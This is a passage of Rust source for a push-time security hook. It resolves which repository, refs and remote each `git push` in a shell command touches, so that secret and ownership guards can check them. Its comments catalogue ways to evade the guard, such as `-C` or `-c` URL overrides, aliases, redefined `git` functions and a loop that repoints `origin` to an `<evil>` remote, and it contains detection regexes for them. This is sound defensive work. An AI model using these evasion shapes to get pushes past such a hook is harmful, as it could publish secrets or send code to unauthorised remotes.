//! `git push` detection and outbound-range resolution.
//!
//! The primitive a push-time content guard stands on: *which* pushes will this
//! command run, *from which directory*, *publishing which refs*, and *which
//! commits* does each of those refs put on a remote that does not have them yet.
//!
//! **Why this is not [`crate::shell::git_push_segments`].** That helper answers a
//! narrower question — the words after `push`, for ownership-validating the
//! destination — and answers it from a FLAT [`split_segments`] view with no
//! working-directory tracking. Three gaps make it unusable for a content guard:
//!
//! - **No `-C`.** `git -C /elsewhere push` publishes from a different repository.
//!   A scanner that resolves its range in the session's cwd scans the wrong
//!   history and finds nothing — a silent miss, which for a secret guard is a
//!   published secret.
//! - **Flat expansion.** A flat view splices a `$(cd /x)`'s `cd` into the parent
//!   stream, moving the tracked directory for segments the shell still runs in
//!   the parent's cwd. This is the exact miss `enforce_worktree`'s
//!   `collect_targets` walk was built non-flat to reject (cadence-hooks#228), and
//!   this walk mirrors it.
//! - **No refspecs.** `git push origin branchB` publishes `branchB`, not `HEAD`.
//!   A range derived from `HEAD` scans a branch the push never touches.
//!
//! **Fail direction.** Every ambiguity here resolves toward *seeing more*, never
//! toward a quiet allow. An unclassifiable option leaves its value visible as a
//! candidate refspec (extra scanning), an unrecognised `--all` spelling still
//! sets [`PushInvocation::all_or_mirror`] (scan everything), and a redirect this
//! walk cannot model sets [`PushInvocation::unresolved`] so the caller can refuse
//! rather than scan a subset. The one flag whose detection would *license* an
//! allow — `--dry-run` — is matched EXACTLY for that reason: under-detecting it
//! costs a false block on a harmless command, over-detecting it would let a real
//! push through unscanned.

use std::borrow::Cow;

use crate::shell::{
    COMMAND_RUNNERS, GitExec, GitOutput, MAX_WRAPPER_DEPTH, TRANSPARENT, apply_cd_target,
    child_scripts_but_git_exec, command_word, executable_tokens_marked, git_command_line_aliases,
    git_exec, git_output_detailed, installs_trap_action, is_assignment_word, peel_command_runners,
    resolve_cd_target, runs_an_unreadable_command, runs_in_found_directories,
    split_segments_with_ops, strip_group_wrappers, unescape_word,
};

/// One refspec a `git push` names, with the local side a range resolver needs.
///
/// Per-refspec rather than per-command, because the two kinds coexist in one
/// invocation: `git push origin :dead newbranch` deletes `dead` AND publishes
/// `newbranch`, so a command-level "this is a delete, skip it" test drops the
/// publish (plan finding, cadence-hooks#237).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Refspec {
    /// The refspec exactly as written, for a message that quotes the command.
    pub raw: String,
    /// The LOCAL side — the ref whose outbound commits this push publishes.
    /// `None` for a delete (nothing is published) and for a source this walk
    /// could not read.
    pub source: Option<String>,
    /// The remote side, when the refspec named one.
    pub destination: Option<String>,
    /// A ref deletion: `--delete`/`-d`, or a leading-colon `:dead`. Publishes
    /// no content, so a scanner skips it — this one refspec, never the command.
    pub is_delete: bool,
    /// This refspec was not written on the command line: it stands for the ref
    /// a bare `git push` publishes (`HEAD`). Kept distinguishable so a caller
    /// can report "we assumed HEAD" rather than quoting a refspec the user
    /// never typed.
    pub implicit: bool,
}

/// One `git push` the command will run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PushInvocation {
    /// The directory git will run in, after `cd` accumulation and any `-C`
    /// redirect. Always populated — the caller's cwd when nothing moved it.
    pub work_dir: String,
    /// The refspecs this push publishes, in command order. Never empty: a bare
    /// `git push` yields one implicit `HEAD` refspec.
    pub refspecs: Vec<Refspec>,
    /// `--all` or `--mirror` — the push is not confined to the named refspecs,
    /// so a caller must widen its range to every local branch (or refuse).
    pub all_or_mirror: bool,
    /// `--tags` — every ref under `refs/tags` is pushed. **A caller must treat
    /// this exactly like [`PushInvocation::all_or_mirror`] for range purposes.**
    ///
    /// Deliberately a separate field rather than folded into `all_or_mirror`: a
    /// caller that reads `all_or_mirror` as "widen to every local branch" still
    /// misses a tag pointing at a commit no branch reaches, which is the whole
    /// hazard. Measured — `git push --tags origin` publishes a tagged
    /// off-branch commit while `rev-list HEAD --not --remotes` is empty, and
    /// empty is the one shape a caller may read as allow.
    ///
    /// `--follow-tags` is NOT this flag: it pushes only tags reachable from the
    /// commits being pushed, which the refspec range already covers.
    pub tags: bool,
    /// `--dry-run`/`-n`: git contacts the remote but publishes nothing, so a
    /// content guard may allow. Matched exactly — see the module docs.
    pub dry_run: bool,
    /// `--mirror` alone, of the two [`PushInvocation::all_or_mirror`] spellings:
    /// every ref under `refs/`, where `--all` is only `refs/heads`. Read only
    /// by a caller that tells the two apart (`prevent-secret-push`).
    pub mirror: bool,
    /// `--follow-tags` (`Some(true)`) or `--no-follow-tags` (`Some(false)`),
    /// the last one written; `None` leaves `push.followTags` in charge.
    pub follow_tags: Option<bool>,
    /// The last `--recurse-submodules` value written (`--no-recurse-submodules`
    /// reads `no`); `None` leaves `push.recurseSubmodules` in charge.
    pub recurse_submodules: Option<String>,
    /// This walk saw something it cannot model well enough to scan a COMPLETE
    /// range, so a caller must refuse rather than scan a subset — the plan's
    /// "never silently scan a subset and exit 0".
    ///
    /// **Which repository** — the push may not run where this walk thinks:
    ///
    /// - a `--git-dir`/`--work-tree` flag, or a `GIT_DIR=`/`GIT_WORK_TREE=` env
    ///   assignment, pointing git at a repository this walk would have to model
    ///   git's setup rules to name correctly;
    /// - a directory change this walk could not follow — a bare `cd`, `cd -`, a
    ///   `$`-bearing target, `popd`, a bare `pushd`. Every later push in that
    ///   scope is marked, because the tracked directory is now a guess.
    ///
    /// **Which refs** — a bare push may publish more than the current branch:
    ///
    /// - `push.default=matching`, or any configured `remote.<name>.push`
    ///   refspec, read from the repository;
    /// - the same two keys arriving on the command line via `-c` /
    ///   `--config-env`, which the repository probe cannot see;
    /// - any `GIT_CONFIG_*` env assignment, which can inject either key and
    ///   which that probe reports "not configured" about.
    ///
    /// The ref causes apply only when the refspecs are implicit — a named
    /// refspec replaces that computation anyway.
    pub unresolved: bool,
    /// The **which repository** half of [`PushInvocation::unresolved`] alone:
    /// the push may not run in [`PushInvocation::work_dir`], so neither its
    /// history nor its remotes can be read from there. Set by every
    /// which-repository cause listed on `unresolved` (a redirect flag or env
    /// assignment, an unfollowable directory change — an `eval`, a `trap`
    /// action, a `$` target — and a push hidden behind a prefix this walk
    /// cannot peel), and by none of the which-refs causes. An ownership guard
    /// reads this one: a `push.default=matching` repository changes what a
    /// push publishes, never where it goes (cadence-hooks#1095).
    pub repository_unresolved: bool,
    /// A directory change before this push that the walk could not follow,
    /// with no which-repository cause in play: a `cd`/`pushd` whose target it
    /// cannot read (`cd "$VAR"`, `cd -`, `cd $(other)`), `popd`, or a bare
    /// `cd`. The push may run in another directory, but nothing shows it is
    /// meant to reach another repository, so an ownership guard nudges on it
    /// rather than blocking. Implies [`PushInvocation::unresolved`]
    /// (cadence-hooks#1095 ruling).
    pub directory_unverified: bool,
    /// URLs a `-c remote.<name>.url=…`/`remote.<name>.pushurl=…` global hands
    /// this push, as written. Real git sends the push there instead of the
    /// URL the repository's own config names (measured), so an ownership
    /// guard must judge each of these too — every one, whichever remote it
    /// names, which is stricter than git and costs only a nonsense command
    /// (cadence-hooks#1131).
    pub config_destinations: Vec<String>,
    /// A `-c`/`--config-env` global rewrites where this push goes in a way the
    /// command text cannot show: a `url.<base>.insteadOf`/`pushInsteadOf`
    /// rewrite, an `include.path`/`includeIf.<cond>.path` that can load either
    /// key from a file, a `--config-env` URL key whose value lives in the
    /// environment, or a URL value carrying `$` or a backtick. An ownership
    /// guard must refuse it (cadence-hooks#1131).
    pub destination_unreadable: bool,
    /// Remotes a `-c remote.pushDefault=…`/`branch.<b>.pushRemote=…`/
    /// `branch.<b>.remote=…` global, or an earlier segment writing one of those
    /// keys, points this push at, as written: a remote name or a URL. Real git
    /// sends a bare push to that remote, while the guard's probe reads the
    /// configured one, so an ownership guard must judge each of these too —
    /// every one, even for a push that names its remote, which is stricter
    /// than git (cadence-hooks#1156).
    pub config_remotes: Vec<String>,
    /// The repository argument as written — git's first positional, else a
    /// `--repo` value ([`crate::shell::push_repository_argument`]). `None` for
    /// a bare `git push`, where git uses the tracking remote. A remote name or
    /// a URL; resolving it is the caller's job.
    pub repository: Option<String>,
    /// The push runs under a `-c alias.X=push` alias (`git -c alias.p=push p
    /// origin feat`). A text-based reading of the command sees no `git push`
    /// there, so a caller judges this invocation's destination from the
    /// fields above, wherever it runs (cadence-hooks#1172).
    pub via_alias: bool,
}

/// Every `git push` the command runs, in command order.
///
/// `cwd` is the directory the command starts in. The walk is non-flat: a child
/// script (`sh -c '…'`, `$(…)`, backticks) is recursed with its own directory
/// scope, so a `cd` inside a subshell cannot move the parent's tracked
/// directory. Bounded by [`MAX_WRAPPER_DEPTH`].
///
/// A push found inside a substitution is REPORTED, not executed — the walk only
/// reads text. Reporting it is the point: `$(git push origin main)` really does
/// push, and a scanner that only looked at top-level segments would miss it.
pub fn push_invocations(command: &str, cwd: &str) -> Vec<PushInvocation> {
    let mut out = Vec::new();
    let gh_hosts = GhHosts::for_command(command);
    let walk = Walk::for_command(command, true, &gh_hosts);
    let mut writes = Vec::new();
    collect_push_invocations(
        command,
        cwd,
        0,
        Doubt::default(),
        walk,
        &mut writes,
        &mut out,
    );
    apply_config_writes_everywhere(command, &writes, &mut out);
    out
}

/// [`push_invocations`] without the repository config probe: every push the
/// command runs, where it runs, and whether that location is knowable
/// ([`PushInvocation::repository_unresolved`]). No subprocess is spawned, so
/// [`PushInvocation::unresolved`] carries only the causes readable from the
/// command text — a caller that needs the ref half must use
/// [`push_invocations`]. For a guard that asks where a push goes, not what it
/// publishes (cadence-hooks#1095).
pub fn push_locations(command: &str, cwd: &str) -> Vec<PushInvocation> {
    let mut out = Vec::new();
    let gh_hosts = GhHosts::for_command(command);
    let walk = Walk::for_command(command, false, &gh_hosts);
    let mut writes = Vec::new();
    collect_push_invocations(
        command,
        cwd,
        0,
        Doubt::default(),
        walk,
        &mut writes,
        &mut out,
    );
    apply_config_writes_everywhere(command, &writes, &mut out);
    out
}

/// Hand every config write in the command to every push in it, when the
/// command can run a push AFTER a write that follows it in the text.
///
/// The walk hands a push only the writes that precede it, which is the order
/// a straight-line command runs in — so `git push -u origin main && git
/// remote add upstream <other-owner-url>` stays allowed. A loop body, a
/// function defined before its call, a `trap` action, and a runner that can
/// run its script more than once (`xargs`, `watch`, `parallel`, `find -exec`)
/// break that order:
/// `for i in 1 2; do git push origin main; git remote set-url origin <evil>;
/// done` pushes to `<evil>` the second time round. The trigger is a plain
/// text match, so a mention in a message only makes the judgment stricter
/// (cadence-hooks#1156).
fn apply_config_writes_everywhere(
    command: &str,
    writes: &[ConfigRedirect],
    out: &mut [PushInvocation],
) {
    static REORDERS: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
        regex::Regex::new(r"\b(?:for|while|until|select|function|trap|xargs|watch|parallel)\b|-(?:exec|execdir|ok|okdir)\b|\(\s*\)")
            .expect("pattern should compile")
    });
    if writes.is_empty() || !REORDERS.is_match(command) {
        return;
    }
    for push in out {
        apply_config_writes(writes, push);
    }
}

/// More config writes than this in one command are refused rather than
/// copied onto every push: the count is the command's to choose, and a
/// 200 KB `git remote add …; git push …` flood would otherwise copy every
/// write onto every push.
const MAX_CONFIG_WRITES: usize = 16;

/// Record `writes` on `push`, or mark it unreadable past
/// [`MAX_CONFIG_WRITES`].
fn apply_config_writes(writes: &[ConfigRedirect], push: &mut PushInvocation) {
    if writes.len() > MAX_CONFIG_WRITES {
        push.destination_unreadable = true;
        return;
    }
    for write in writes {
        write.apply_to(push);
    }
}

/// What a scope cannot vouch for, carried into the scripts it spawns.
#[derive(Debug, Clone, Copy, Default)]
struct Doubt {
    /// A which-repository cause: see [`PushInvocation::repository_unresolved`].
    repository: bool,
    /// An unfollowable directory change: see
    /// [`PushInvocation::directory_unverified`].
    directory: bool,
}

/// Settings for one whole walk, the same at every depth.
#[derive(Debug, Clone, Copy)]
struct Walk<'a> {
    /// Ask the repository how a bare push computes its refs.
    probe_config: bool,
    /// The command cannot have replaced `git` or `ssh-agent`, so a known
    /// substitution may be read by name — see
    /// [`may_redefine_known_commands`].
    trusts_known_commands: bool,
    /// The hosts a `gh repo clone OWNER/REPO` may clone from.
    gh_hosts: &'a GhHosts,
}

impl<'a> Walk<'a> {
    fn for_command(command: &str, probe_config: bool, gh_hosts: &'a GhHosts) -> Self {
        Self {
            probe_config,
            trusts_known_commands: !may_redefine_known_commands(command),
            gh_hosts,
        }
    }
}

/// The hosts `gh` may resolve a bare `OWNER/REPO` against anywhere in one
/// command: the inherited `GH_HOST` (else github.com), plus every literal
/// `GH_HOST=<host>` the command writes. `gh repo clone OWNER/REPO` clones
/// from `GH_HOST`, so mapping it to github.com always let
/// `export GH_HOST=other.example; gh repo clone o/r && cd r && git push`
/// through as a github.com push.
///
/// Read from the whole text, quotes and backslashes removed so that
/// `GH_HO"ST"=x` still reads as the name the shell assembles, and without
/// regard to order or scope: the set only grows, so an assignment after the
/// clone, or in a subshell, can only add a host to judge. Any other mention —
/// `$GH_HOST`, `${GH_HOST:=x}`, `read GH_HOST`, a value that is not a plain
/// host — makes the host unreadable, and so does a builtin that assigns a
/// name the text does not spell: a declaring builtin or `read`/`mapfile`/
/// `getopts`/`printf -v` naming a non-literal variable (`export GH_HOS${X}T=…`,
/// `read "$n"`), or an `eval` of text that is not literal — see
/// [`GhHosts::observe_statements`]. This mirrors the candidate set
/// guard-gh-write keeps for the same variable, more coarsely: coarseness here
/// only costs a refusal.
#[derive(Debug, Default)]
struct GhHosts {
    hosts: Vec<String>,
    unreadable: bool,
    /// Something in the command or the environment may make gh act as another
    /// account than the one its config file names: a token variable, or a
    /// `gh auth` command. A bare `gh repo clone REPO` is then unreadable.
    account_unreadable: bool,
    /// [`signed_in_user`] per host, read once: a flood of clones costs one
    /// file read.
    users: std::cell::RefCell<std::collections::HashMap<String, Option<String>>>,
}

impl GhHosts {
    /// The account gh is signed in to on `host`, or `None` when it cannot be
    /// told ([`Self::account_unreadable`], or no readable config).
    fn signed_in_user(&self, host: &str) -> Option<String> {
        if self.account_unreadable {
            return None;
        }
        self.users
            .borrow_mut()
            .entry(host.to_string())
            .or_insert_with(|| signed_in_user(host))
            .clone()
    }
}

impl GhHosts {
    fn for_command(command: &str) -> Self {
        let mut hosts = Self {
            hosts: vec![crate::config::default_host()],
            unreadable: false,
            account_unreadable: false,
            users: Default::default(),
        };
        // Only a `gh repo clone` reads this; skip the scan for anything else.
        if !command.contains("clone") {
            return hosts;
        }
        let flat: String = command
            .chars()
            .filter(|c| !matches!(c, '"' | '\'' | '\\'))
            .collect();
        hosts.observe(&flat);
        hosts.observe_statements(command);
        const ACCOUNT_VARIABLES: [&str; 5] = [
            "GH_TOKEN",
            "GITHUB_TOKEN",
            "GH_ENTERPRISE_TOKEN",
            "GITHUB_ENTERPRISE_TOKEN",
            "GH_CONFIG_DIR",
        ];
        hosts.account_unreadable = ACCOUNT_VARIABLES.iter().any(|name| {
            flat.contains(name) || std::env::var_os(name).is_some_and(|_| *name != "GH_CONFIG_DIR")
        }) || flat.contains("XDG_CONFIG_HOME")
            || flat
                .split(|c: char| !c.is_ascii_alphanumeric())
                .any(|word| word == "auth");
        hosts
    }

    /// The builtins that can assign a variable the text does not spell.
    ///
    /// Only an operand that names a variable counts, so `export
    /// PATH="$HOME/bin:$PATH"`, `printf '%s' "$x"` and `read -p "$prompt" x`
    /// stay readable: a non-literal VALUE is not a non-literal NAME. A literal
    /// `GH_HOST` name adds its value, which also covers a name
    /// [`command_segments`](crate::shell::command_segments) resolved from a
    /// same-command assignment (`n=GH_HOST; export $n=x`).
    ///
    /// `eval` runs text as a script, so a non-literal one is unreadable — except
    /// the whole-operand `$(ssh-agent …)`, `$(brew shellenv …)` and `$(pyenv
    /// init …)` idioms (plain words only: no second command, quote, or
    /// redirection inside), which print a fixed set of variables, when the command
    /// cannot have redefined those names. `direnv export` is NOT among them: it
    /// prints whatever the `.envrc` exports, `GH_HOST` included.
    fn observe_statements(&mut self, command: &str) {
        static KNOWN_EVAL: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
            regex::Regex::new(
                r#"^\$\((?:ssh-agent|brew[ \t]+shellenv|pyenv[ \t]+init|rbenv[ \t]+init|direnv[ \t]+hook|starship[ \t]+init|zoxide[ \t]+init|fnm[ \t]+env|mise[ \t]+activate)\b[^$`()'";&|<>\\\n]*\)$"#,
            )
            .expect("pattern should compile")
        });
        static REDEFINES_KNOWN_EVAL: std::sync::LazyLock<regex::Regex> =
            std::sync::LazyLock::new(|| {
                regex::Regex::new(r"(?:brew|pyenv)[ \t]*\(|\bfunction[ \t]+\\?(?:brew|pyenv)\b")
                    .expect("pattern should compile")
            });
        let known_evals_ok =
            !may_redefine_known_commands(command) && !REDEFINES_KNOWN_EVAL.is_match(command);
        for segment in crate::shell::command_segments(command) {
            let tokens = crate::shell::tokenize(&segment);
            for (at, word) in tokens.iter().enumerate() {
                // Operands only: a redirection and a detached target name a
                // file, not a variable.
                let mut rest: Vec<&String> = Vec::new();
                let mut skip_target = false;
                for token in &tokens[at + 1..] {
                    if std::mem::take(&mut skip_target) {
                        continue;
                    }
                    if crate::shell::is_redirect_token(token) {
                        skip_target = token.ends_with(['<', '>']);
                        continue;
                    }
                    rest.push(token);
                }
                match command_word(word).as_ref() {
                    "export" | "declare" | "typeset" | "readonly" | "local" => {
                        for operand in rest.iter().filter(|t| !t.starts_with(['-', '+'])) {
                            let (name, value) = match operand.split_once('=') {
                                Some((name, value)) => (name, Some(value)),
                                None => (operand.as_str(), None),
                            };
                            self.observe_name(name, value);
                        }
                    }
                    "read" | "mapfile" | "readarray" => {
                        let value_options = if word.ends_with("read") {
                            "dinNptu"
                        } else {
                            "dnOsuCc"
                        };
                        let mut idx = 0;
                        while let Some(operand) = rest.get(idx) {
                            idx += 1;
                            if let Some(cluster) =
                                operand.strip_prefix('-').filter(|c| !c.is_empty())
                            {
                                let last = cluster.chars().last().unwrap_or(' ');
                                if last == 'a' && word.ends_with("read") {
                                    if let Some(name) = rest.get(idx) {
                                        self.observe_assigned(name);
                                    }
                                    idx += 1;
                                } else if value_options.contains(last) {
                                    idx += 1;
                                }
                                continue;
                            }
                            self.observe_assigned(operand);
                        }
                    }
                    "getopts" => {
                        if let Some(name) = rest.iter().filter(|t| !t.starts_with('-')).nth(1) {
                            self.observe_assigned(name);
                        }
                    }
                    "printf" => {
                        let mut idx = 0;
                        while let Some(operand) = rest.get(idx) {
                            idx += 1;
                            if *operand == "-v" {
                                if let Some(name) = rest.get(idx) {
                                    self.observe_assigned(name);
                                }
                                idx += 1;
                            } else if let Some(name) = operand.strip_prefix("-v") {
                                self.observe_assigned(name);
                            } else {
                                break;
                            }
                        }
                    }
                    "eval" => {
                        let unreadable = rest.iter().any(|operand| {
                            operand.contains("GH_HOST")
                                || (operand.contains(['$', '`'])
                                    && !(known_evals_ok && KNOWN_EVAL.is_match(operand)))
                        });
                        if unreadable {
                            self.unreadable = true;
                        }
                    }
                    _ => {}
                }
            }
        }
    }

    /// A variable `read`/`mapfile`/`getopts`/`printf -v` assigns: a value the
    /// text never shows.
    fn observe_assigned(&mut self, name: &str) {
        self.observe_name(name, None);
        if name == "GH_HOST" {
            self.unreadable = true;
        }
    }

    /// A variable a declaring builtin names, with the value when it wrote one.
    fn observe_name(&mut self, name: &str, value: Option<&str>) {
        let literal = name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
        if !literal {
            self.unreadable = true;
        } else if name == "GH_HOST" {
            match value {
                None => {}
                Some(value) => match plain_host(value) {
                    Some(host) if !self.hosts.contains(&host) => self.hosts.push(host),
                    Some(_) => {}
                    None => self.unreadable = true,
                },
            }
        }
    }

    fn observe(&mut self, flat: &str) {
        let is_ident = |c: char| c.is_ascii_alphanumeric() || c == '_';
        for (at, _) in flat.match_indices("GH_HOST") {
            let before = flat[..at].chars().next_back();
            let after = &flat[at + "GH_HOST".len()..];
            // Another variable that merely contains the name.
            if before.is_some_and(is_ident) || after.starts_with(is_ident) {
                continue;
            }
            let head = flat[..at].trim_end();
            let bare = after
                .chars()
                .next()
                .is_none_or(|c| c.is_whitespace() || matches!(c, ';' | '&' | '|' | ')'));
            // `unset GH_HOST` returns to the inherited host and `export
            // GH_HOST` exports the value it has; both are candidates already.
            if bare
                && ["unset", "unset -v", "export"]
                    .iter()
                    .any(|v| head.ends_with(v))
            {
                continue;
            }
            // An assignment word starts a word: `${GH_HOST:=x}` and `$GH_HOST`
            // do not.
            let starts_word =
                before.is_none_or(|c| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '('));
            let Some(value) = after.strip_prefix('=').filter(|_| starts_word) else {
                self.unreadable = true;
                continue;
            };
            let value = value
                .split(|c: char| {
                    c.is_whitespace() || matches!(c, ';' | '&' | '|' | ')' | '<' | '>')
                })
                .next()
                .unwrap_or_default();
            match plain_host(value) {
                Some(host) => {
                    if !self.hosts.contains(&host) {
                        self.hosts.push(host);
                    }
                }
                None => self.unreadable = true,
            }
        }
    }
}

/// The account gh is signed in to on `host`: the `user:` gh's own config file
/// (`hosts.yml` under `$GH_CONFIG_DIR`, else `$XDG_CONFIG_HOME/gh`, else
/// `~/.config/gh`) records under the host's key. Read from disk with no
/// network; `None` when the file is unreadable, or names no plain login
/// (cadence-hooks#1172).
fn signed_in_user(host: &str) -> Option<String> {
    let dir = match std::env::var_os("GH_CONFIG_DIR").filter(|dir| !dir.is_empty()) {
        Some(dir) => std::path::PathBuf::from(dir),
        None => match std::env::var_os("XDG_CONFIG_HOME").filter(|dir| !dir.is_empty()) {
            Some(dir) => std::path::Path::new(&dir).join("gh"),
            None => std::path::Path::new(&crate::paths::user_home_lossy_or_default())
                .join(".config")
                .join("gh"),
        },
    };
    signed_in_user_in(&dir, host)
}

/// [`signed_in_user`] for one config directory.
fn signed_in_user_in(dir: &std::path::Path, host: &str) -> Option<String> {
    let path = dir.join("hosts.yml");
    if std::fs::metadata(&path).ok()?.len() > 1 << 20 {
        return None;
    }
    let text = std::fs::read_to_string(path).ok()?;
    let mut in_host = false;
    let mut child_indent = None;
    for line in text.lines() {
        let indent = line.len() - line.trim_start().len();
        let body = line.trim();
        if body.is_empty() || body.starts_with('#') {
            continue;
        }
        if indent == 0 {
            in_host = body
                .strip_suffix(':')
                .is_some_and(|key| key.trim_matches(['"', '\'']).eq_ignore_ascii_case(host));
            child_indent = None;
            continue;
        }
        if !in_host {
            continue;
        }
        // The host's own keys sit at the indent its first child has; a
        // `users:` map nests further and is not read.
        let child = *child_indent.get_or_insert(indent);
        if indent != child {
            continue;
        }
        if let Some(value) = body.strip_prefix("user:") {
            let value = value.split(" #").next().unwrap_or("").trim();
            let value = value.trim_matches(['"', '\'']);
            return (!value.is_empty()
                && value
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')))
            .then(|| value.to_string());
        }
    }
    None
}

/// `value` lowercased when it is a plain host name (letters, digits, `.`,
/// `-`, and a `:port`), else `None`.
fn plain_host(value: &str) -> Option<String> {
    (!value.is_empty()
        && value
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':')))
    .then(|| value.to_ascii_lowercase())
}

/// Could this command change what `git` or `ssh-agent` runs, before a
/// substitution of either is read by name (cadence-hooks#1095 review)?
///
/// The two allows — `cd "$(git rev-parse --show-toplevel)"` and
/// `eval "$(ssh-agent -s)"` — trust the command NAMES. A function or alias
/// named either (`ssh-agent(){ echo "cd /x"; }`), a `PATH` assignment or export,
/// `hash`, `enable`, a sourced file, or a `BASH_ENV=`/`ENV=` start-up file can
/// each make the name run something else. Matched on the raw text, quotes and
/// all, so a mention inside a message also disables the allows: that only
/// costs a nudge or a block, and never an allow the command did not earn. Any
/// `alias` at all counts, since `shopt -s expand_aliases` can arrive by the
/// same routes.
pub fn may_redefine_known_commands(command: &str) -> bool {
    static PATTERN: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
        regex::Regex::new(concat!(
            r"(?:git|ssh-agent|direnv|brew|pyenv|rbenv|starship|zoxide|fnm|mise)[ \t]*\([ \t]*\)",
            r"|\bfunction[ \t]+\\?(?:git|ssh-agent|direnv|brew|pyenv|rbenv|starship|zoxide|fnm|mise)\b",
            r"|\balias\b|\bhash\b|\benable\b|\bsource\b",
            r"|(?:^|[;&|(\n])[ \t]*\.[ \t]",
            r"|\bPATH\+?=",
            r"|\b(?:export|declare|typeset|readonly|local)\b[^;&|\n]*\bPATH\b",
            r"|\b(?:BASH_ENV|ENV)=",
        ))
        .expect("pattern should compile")
    });
    PATTERN.is_match(command)
}

/// Is every `$(…)` and backtick in this segment one the shell will expand?
/// Deliberately coarse: a segment with any single quote or backslash is
/// answered `false`, so `cd '$(git rev-parse --show-toplevel)'` — a literal
/// directory name after quote removal, which the tokens no longer show — cannot
/// pass for the substitution it spells (cadence-hooks#1095 review). Double
/// quotes do not stop expansion and are allowed.
fn substitutions_are_live(segment: &str) -> bool {
    !segment.contains(['\'', '\\'])
}

/// Most open subshells [`collect_push_invocations`] keeps a directory for.
const MAX_SUBSHELL_SCOPES: usize = 32;

/// Recursive worker for [`push_invocations`], mirroring
/// `enforce_worktree::collect_targets`: one `effective_dir` per script scope,
/// children recursed on the directory in effect where they appear.
///
/// `inherited_unresolved` is the env half of that mirror, and it is the reason
/// this parameter exists rather than a local: a `GIT_DIR=`/`GIT_WORK_TREE=`
/// prefix on a WRAPPER segment is exported into the shell it spawns, so the
/// push inside `GIT_WORK_TREE=/x sh -c 'git push origin main'` really does run
/// redirected. Computing the flag on the wrapper and dropping it at the
/// recursion boundary handed the caller a resolvable-looking `work_dir` with
/// `unresolved: false` — the #228/#378 miss `collect_targets` threads
/// `inherited_env` to close, reopened here until this parameter landed. It
/// carries an unfollowable directory change for the same reason: a child starts
/// in the parent's cwd, so a cwd the parent lost is lost for the child too.
fn collect_push_invocations(
    script: &str,
    cwd: &str,
    depth: usize,
    inherited: Doubt,
    walk: Walk<'_>,
    writes: &mut Vec<ConfigRedirect>,
    out: &mut Vec<PushInvocation>,
) {
    let mut effective_dir = cwd.to_string();
    // Set by an EARLIER segment of this scope, and outliving it: a persistent
    // env redirect, or a directory change this walk could not follow. Either
    // way every later push in the scope is one this walk cannot vouch for.
    let mut scope_unresolved = inherited.repository;
    // The directory half, kept apart so a caller can tell `cd "$VAR"` from an
    // `eval` or a `GIT_DIR=` redirect.
    let mut scope_directory = inherited.directory;

    // A `( … )` subshell's `cd` ends with it (cameronsjo/cadence-hooks#1172):
    // the directory state each open one started from, and the closes the
    // previous segment left to apply. Off for a script with a `case`, whose
    // `pattern)` arms read as closers this walk cannot tell from real ones.
    let mut scopes_subshells = !script.contains("case");
    let mut subshells: Vec<(String, bool)> = Vec::new();
    let mut pending_closes = 0;
    for (segment, _next_op) in split_segments_with_ops(script) {
        for _ in 0..std::mem::take(&mut pending_closes) {
            if let Some((dir, directory)) = subshells.pop() {
                effective_dir = dir;
                scope_directory = directory;
            }
        }
        if scopes_subshells {
            let (opens, closes) = crate::shell::subshell_shape(&segment);
            if subshells.len() + opens > MAX_SUBSHELL_SCOPES {
                // Nested past what a real command does (and what a flood of
                // `(cd a;` could make this copy quadratically): stop
                // scoping, so the `cd` leaks as it always did.
                scopes_subshells = false;
                scope_directory = true;
            } else {
                for _ in 0..opens {
                    subshells.push((effective_dir.clone(), scope_directory));
                }
                pending_closes = closes;
            }
        }
        let trimmed = segment.trim();
        // A function definition glued to its body (`f(){ git push …`) left
        // `f(){` in command position, so the push inside it was never seen
        // while the call later ran it (cadence-hooks#1156). The body is read
        // where it is written, as a spaced `f() { …` already was.
        let segment = strip_function_head(&segment);
        let segment = strip_group_wrappers(segment);
        // **An unbalanced closer means the trim ate part of a real word.**
        // `strip_group_wrappers` removes a trailing `)`/`}` unconditionally,
        // without checking that an opener matched — so a segment whose last
        // token legitimately ends in one loses those bytes before tokenization.
        // `}` is an ordinary character there (measured: `bash -c 'echo push
        // origin main}'` prints it) and `git check-ref-format refs/heads/'main}'`
        // answers OK, so both faces are wrong ANSWERS rather than misses:
        // `git push origin secret}` reported the refspec `secret`, a different
        // ref than the command publishes, and `cd /other} && git push` reported
        // `/other` as the work dir with `unresolved: false` for a push that runs
        // in `/other}`. The second is the F9 mechanism reached through a path
        // that marked nothing.
        //
        // **The question is what the trim ATE, not how many closers there
        // were.** An opener/closer count was tried first and was the wrong
        // grain twice over. `split_segments_with_ops` cuts on `&&`, `;` and
        // `|`, so a wrapper's opener and closer land in different segments:
        // `(cd /other && git push origin main)` and `$(git push origin main)`
        // are ordinary, correct commands whose closing segment carries a closer
        // and no opener, and the count refused every one of them. In the other
        // direction a matched opener PAID for a closer that was a real word
        // byte, so `{ git push origin secret}; }` kept its wrong answer.
        //
        // Two measured shell facts settle it without any bookkeeping:
        //
        // 1. `bash -c 'echo hi)'` is a syntax error. Outside a `case` label an
        //    unquoted `)` is always an operator, so a segment-trailing `)` glued
        //    to a word cannot occur in a command that runs — trimming `)` is
        //    always safe, and `)` is never counted here.
        // 2. `bash -c '{ echo hi }'` is a syntax error while
        //    `bash -c '{ echo hi;}'` runs. A `}` closer is a reserved word, so
        //    it must be preceded by `;` or a newline — and this walk splits on
        //    both. Inside a segment, a trailing `}` glued to anything else is
        //    never a group closer.
        //
        // So: a `}` in the trailing trim run whose preceding character is
        // neither whitespace nor `;` is a real word byte the trim is about to
        // eat. The shared primitive now keeps such a `}` itself
        // (cadence-hooks#889), so the refspec and directory it reports are the
        // real words; this refusal stays as the belt to that brace, and still
        // covers the one shape the primitive trims by design — a `}` after `)`
        // (cadence-hooks#237 security review, F28/F29/F30).
        let trailing_trim_run =
            trimmed.len() - trimmed.trim_end_matches([')', '}', ';', ' ', '\t']).len();
        //
